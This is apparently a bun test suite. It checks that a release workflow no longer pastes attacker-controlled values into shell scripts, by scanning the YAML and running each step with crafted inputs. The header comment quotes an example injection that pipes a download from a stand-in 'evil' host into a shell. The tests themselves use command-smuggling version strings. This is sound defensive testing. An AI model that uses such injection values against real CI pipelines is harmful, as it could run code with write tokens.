/**
 * Finding #3214: the release workflows pasted attacker-controlled text into
 * shell source.
 *
 * auto-release.yml (contents: write) expanded `${{ github.event.pull_request.title }}`
 * and the PR labels and author inside `run:` scripts, and version-bump-on-main.yml
 * (contents: write) expanded `${{ github.event.head_commit.message }}`. The
 * runner substitutes `${{ }}` into the script TEXT before bash parses it, so a
 * PR title like `x"; curl evil | sh; echo "` ran with a write token.
 *
 * Both workflows were replaced by release-pr.yml (#3658), which holds
 * contents, pull-requests and actions write tokens. PR titles never reach its
 * shell at all (git log inside the bun scripts, a file for the PR body); the
 * values that do reach `run:` scripts (the workflow_dispatch input, computed
 * versions, the repository name) arrive through `env:` and are read as quoted
 * shell variables. This suite checks both halves:
 *   1. statically, no `run:` script in the workflow contains `${{ }}`, every
 *      action is pinned to a commit SHA, and permissions are per job;
 *   2. dynamically, the real step scripts are executed the way the runner
 *      executes them (expressions substituted as text, env set, bash -eo
 *      pipefail) with crafted values, and nothing runs. `gh` and `bun` are
 *      shimmed so the scripts get to the point where the value is used.
 *
 * No network, no GitHub: bash in a temp dir.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { parse } from "yaml";

const WORKFLOWS = join(import.meta.dir, "..", "..", ".github", "workflows");
const FILES = ["release-pr.yml"];

interface Step {
	name?: string;
	id?: string;
	run?: string;
	env?: Record<string, string>;
}

interface Job {
	permissions?: Record<string, string>;
	steps: Step[];
}

function workflow(file: string): { permissions?: unknown; jobs: Record<string, Job> } {
	return parse(readFileSync(join(WORKFLOWS, file), "utf-8"));
}

function steps(file: string): Step[] {
	return Object.values(workflow(file).jobs).flatMap((j) => j.steps);
}

function step(file: string, idOrName: string): Step {
	const s = steps(file).find((x) => x.id === idOrName || x.name === idOrName);
	if (!s?.run) throw new Error(`no run step ${idOrName} in ${file}`);
	return s;
}

/** Substitute `${{ expr }}` as the runner does: plain text, before bash parses. */
function render(text: string, ctx: Record<string, string>): string {
	return text.replace(/\$\{\{\s*(.+?)\s*\}\}/g, (_m, expr: string) => ctx[expr] ?? "");
}

const dir = mkdtempSync(join(tmpdir(), "wf-injection-"));
afterAll(() => rmSync(dir, { recursive: true, force: true }));

/**
 * Run one step's script like the runner (bash --noprofile --norc -eo pipefail).
 * `prepare` seeds the step's working directory; executables it writes to
 * `<cwd>/shim` shadow the real ones (gh, bun), and every shim call is logged
 * one argument per line to `<cwd>/shim.log`.
 */
function runStep(
	s: Step,
	ctx: Record<string, string>,
	prepare?: (cwd: string) => void,
): { outputs: string; cwd: string; shimLog: string; status: number | null } {
	const cwd = mkdtempSync(join(dir, "step-"));
	mkdirSync(join(cwd, "shim"));
	const outFile = join(cwd, "GITHUB_OUTPUT");
	writeFileSync(outFile, "");
	prepare?.(cwd);
	const script = join(cwd, "step.sh");
	writeFileSync(script, render(s.run as string, ctx));
	const env: Record<string, string> = {
		PATH: `${join(cwd, "shim")}:${process.env.PATH ?? "/usr/bin:/bin"}`,
		HOME: cwd,
		SHIM_LOG: join(cwd, "shim.log"),
		GITHUB_OUTPUT: outFile,
		GITHUB_STEP_SUMMARY: join(cwd, "SUMMARY"),
	};
	for (const [k, v] of Object.entries(s.env ?? {})) env[k] = render(String(v), ctx);
	const r = spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", script], {
		cwd,
		env,
		encoding: "utf-8",
	});
	const shimLog = existsSync(env.SHIM_LOG) ? readFileSync(env.SHIM_LOG, "utf-8") : "";
	return { outputs: readFileSync(outFile, "utf-8"), cwd, shimLog, status: r.status };
}

/** A shim that logs its arguments (one per line, a blank line per call) and runs `body`. */
function shim(cwd: string, name: string, body = "exit 0"): void {
	const file = join(cwd, "shim", name);
	writeFileSync(file, `#!/bin/bash\n{ printf '%s\\n' "$@"; echo; } >> "$SHIM_LOG"\n${body}\n`);
	chmodSync(file, 0o755);
}

/** Payloads that each try to create `marker` if pasted into shell source. */
function payloads(marker: string): string[] {
	return [`1.2.3"; touch ${marker}; echo "`, `1.2.3$(touch ${marker})`, `1.2.3\`touch ${marker}\``];
}

describe("#3214: no expression is expanded inside a run: script", () => {
	for (const file of FILES) {
		test(`${file} has no \${{ }} in any run: block`, () => {
			const offenders = steps(file)
				.filter((s) => s.run?.includes("${{"))
				.map((s) => s.name ?? s.id);
			expect(offenders).toEqual([]);
		});

		test(`${file} pins every action to a commit SHA`, () => {
			const unpinned = readFileSync(join(WORKFLOWS, file), "utf-8")
				.split("\n")
				.filter((l) => /^\s*-?\s*uses:/.test(l))
				.filter((l) => !/@[0-9a-f]{40}\b/.test(l));
			expect(unpinned).toEqual([]);
		});

		test(`${file} grants nothing at the top and only what each job needs`, () => {
			const wf = workflow(file);
			expect(wf.permissions).toEqual({});
			for (const [name, job] of Object.entries(wf.jobs)) {
				expect(job.permissions, `job ${name} declares permissions`).toBeDefined();
				const granted = Object.entries(job.permissions ?? {}).filter(([, v]) => v === "write");
				// The job that merely reads the version writes nothing.
				if (name === "decide") expect(granted).toEqual([]);
				// Nobody gets a write scope beyond contents, pull-requests and actions.
				for (const [scope] of granted)
					expect(["contents", "pull-requests", "actions"]).toContain(scope);
			}
		});
	}
});

describe("#3214: crafted values run nothing", () => {
	test("release-pr: Compute the next version passes the bump input as one argument", () => {
		const marker = join(dir, "m-bump");
		for (const p of payloads(marker)) {
			const { shimLog } = runStep(
				step("release-pr.yml", "next"),
				{ "github.event.inputs.bump": p },
				(cwd) => shim(cwd, "bun", "echo 0.19.1"),
			);
			expect(existsSync(marker)).toBe(false);
			// bun saw the payload as a single argv entry after --bump, not as shell.
			expect(shimLog).toContain(`--bump\n${p}\n`);
		}
	});

	test("release-pr: Open or update the pull request keeps a crafted version and PR titles as text", () => {
		const marker = join(dir, "m-pr");
		const titleBomb = `feat: x"; touch ${marker}; echo "`;
		for (const p of payloads(marker)) {
			const { cwd, shimLog } = runStep(
				step("release-pr.yml", "Open or update the pull request"),
				{
					"steps.next.outputs.next": p,
					"github.repository": "8gi-foundation/8gent-code",
					"secrets.RELEASE_PAT || secrets.GITHUB_TOKEN": "t",
				},
				(cwd) => {
					writeFileSync(join(cwd, "section.md"), `## [x]\n\n### Added\n- ${titleBomb} ([#1](u))\n`);
					shim(cwd, "gh"); // `gh pr list` prints nothing: no open PR, so the step creates one.
				},
			);
			expect(existsSync(marker)).toBe(false);
			expect(shimLog).toContain(`--title\nrelease: v${p}\n`);
			expect(readFileSync(join(cwd, "pr_body.md"), "utf-8")).toContain(titleBomb);
		}
	});

	test("release-pr: Tag the release commit with a crafted version runs nothing", () => {
		const marker = join(dir, "m-tag");
		for (const p of payloads(marker)) {
			const { shimLog, status } = runStep(
				step("release-pr.yml", "Tag the release commit"),
				{ "needs.decide.outputs.version": p },
				(cwd) => {
					const g = (...a: string[]) =>
						spawnSync(
							"git",
							["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", ...a],
							{
								cwd,
								encoding: "utf-8",
							},
						);
					g("init", "-q", "-b", "main");
					g("commit", "-q", "--allow-empty", "-m", "release: v1.2.3");
					shim(cwd, "bun", "git rev-parse HEAD");
				},
			);
			expect(existsSync(marker)).toBe(false);
			expect(shimLog).toContain(`commit\n${p}\n`);
			// git refuses the tag name, so the step fails closed instead of pushing.
			expect(status).not.toBe(0);
		}
	});

	test("release-pr: Start the publish workflows passes the version as one argument", () => {
		const marker = join(dir, "m-dispatch");
		for (const p of payloads(marker)) {
			const { shimLog } = runStep(
				step("release-pr.yml", "Start the publish workflows"),
				{
					"needs.decide.outputs.version": p,
					"github.repository": "o/r",
					"secrets.GITHUB_TOKEN": "t",
				},
				(cwd) => shim(cwd, "gh"),
			);
			expect(existsSync(marker)).toBe(false);
			expect(shimLog).toContain(`--ref\nv${p}\n`);
		}
	});
});
